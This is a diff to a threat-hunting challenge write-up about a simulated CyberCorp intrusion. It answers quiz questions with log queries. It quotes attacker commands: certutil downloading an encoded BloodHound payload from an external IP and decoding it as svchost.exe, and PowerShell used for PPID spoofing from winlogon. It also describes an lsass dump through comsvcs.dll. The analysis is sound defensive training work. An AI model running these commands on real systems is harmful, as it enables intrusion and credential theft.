@@ -130,7 +130,7 @@ The script was split into 7 events and categorised as `win_empire_functions_and_
 
 1. The value of the registry key was decoded with base64 and gzip, and the PE bytes were stored in a byte array `$PEBytes`. 
 2. Invocations of Win32 APIs are done via the `Add-type` cmdlet.
-3. The last lines of the script contain a reference to a variable named `$spawnTo`:
+3. The last part of the script contains a reference to a variable named `$spawnTo`:
 
 ```text
 # spawning of the legitimate dwm.exe process
@@ -140,6 +140,9 @@ $spawnTo = "c:\Windows\System32\dwm.exe"
 4. [T1134.004](https://attack.mitre.org/techniques/T1134/004/): Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. A handle to `winlogon.exe` is obtained:
 
 ```text
+# ppid = winlogon PID
+[int]$ppid = Get-Process -Name "winlogon" | Select -expand ID
+...
 $hSpoofParent = [Kernel32]::OpenProcess(0x1fffff, 0, $ppid)
 ```
 
@@ -180,22 +183,63 @@ Put the PID of the spawned process `dwm.exe` first.
 
 ***Q10 The malicious code run by the script is a Reverse Shell. Identify the IP address and port number of its command center. Sample answer: 192.168.0.1:123***
 
+```text
+(*winlogon.exe* OR *dwm.exe*) AND event_type: NetworkConnection
+```
 
+The network connection comes from yet another process, `rundll32.exe`. Another layer of obfuscation.
 
-***Q11 As a result of running a malicious code, which we talk about in questions 9 and 10, the attacker got a shell on the compromised host. Using this access, the attacker downloaded the Active Directory collection utility to the host in an encoded form. Specify a comma-separated, non-spaced link where the encoded version of the utility was downloaded and a SHA256 hash of the decoded version that was directly run by the attacker on the compromised host. Sample answer: http://domain.com/file,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855***
+***Q11 As a result of running a malicious code, which we talked about in questions 9 and 10, the attacker got a shell on the compromised host. Using this access, the attacker downloaded the Active Directory collection utility to the host in an encoded form. Specify a comma-separated, non-spaced link where the encoded version of the utility was downloaded and a SHA256 hash of the decoded version that was directly run by the attacker on the compromised host. Sample answer: http://domain.com/file,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855***
 
+Looking for `NetworkConnection AND FileCreate` events after the initial `rundll` network connection took place. Limiting results:
 
+```text
+(event_type : "NetworkConnection" or event_type : "filecreate") and not proc_p_file_path : "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+```
+
+1. At `23:46:10.000`, `certutil` (which has a history of being used as a lolbin) makes a network connection, downloads a file `chrome_installer.log2`, and creates a file by the name of `svchost.exe` and . 
+
+At 23:46:10.000:
+
+```text
+certutil  -urlcache -f http://188.135.15.49/chrome_installer.log2 C:\Windows\TEMP\chrome_installer.log2:data
+```
+
+At 23:46:17.000:
+
+```text
+certutil  -decode C:\Windows\TEMP\chrome_installer.log2:data C:\Windows\TEMP\svchost.exe
+```
+
+2. Apparently, bloodhound was run.
+3. `chrome_installer.log2` is a base64 encoded form of Bloodhound, after which `certutil` was used again to decode and save it to disk as `svchost.exe`.
+
+Filtering for `C:\Windows\TEMP\svchost.exe` gives its SHA256, the answer.
 
 ***Q12 During the post-exploitation process, the attacker used one of the standard Windows utilities to create a memory dump of a sensitive system process that contains credentials of active users in the system. Specify the name of the executable file of the utility used and the name of the memory dump file created, separated by a comma without spaces. Sample answer: program.exe,file.ext***
 
+```text
+event_type: FileCreate OR event_type: FileOpen
+```
 
+`rundll32.exe` is used to invoke the exported MiniDump function from `C:\windows\system32\comsvcs.dll` and dump `lsass`. See [LOLBAS](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/).
 
 ***Q13 Presumably, the attacker extracted the password of one of the privileged accounts from the memory dump we discussed in the previous question and used it to run a malicious code on one of the domain controllers. What account are we talking about? Specify its username and password as the answer in login:password format. Sample answer: kate:qwerty***
 
+To execute code on the DC there must be some kind of lateral movement. Looking for suspicious events after the `lsass` dumping:
 
+```text
+event_type: "NetworkConnection" and dev_fqdn: "DC01-CYBERCORP.cybercorp.com"
+```
 
 ***Q14 A compromised user account is a member of two Built-in privileged groups on the Domain Controller. The first group is the Administrators. Find the second group. Provide the SID of this group as an answer. Sample answer: S-1-5-32-545***
 
-
+```text
+dev_fqdn: DC01-CYBERCORP.cybercorp.com AND event_type: AccountGroupList AND *inventory*
+```
 
 ***Q15 As a result of malicious code execution on the domain controller using a compromised account, the attacker got a reverse shell on that host. This shell used a previously not seen IP address as the command center. Specify its address as the answer. Sample answer: 192.168.0.1***
+
+```text
+dev_fqdn: DC01-CYBERCORP.cybercorp.com AND (proc_id:4460 OR proc_p_id:4460 OR proc_c_id:4460 OR proc_tgt_id:4460)
+```
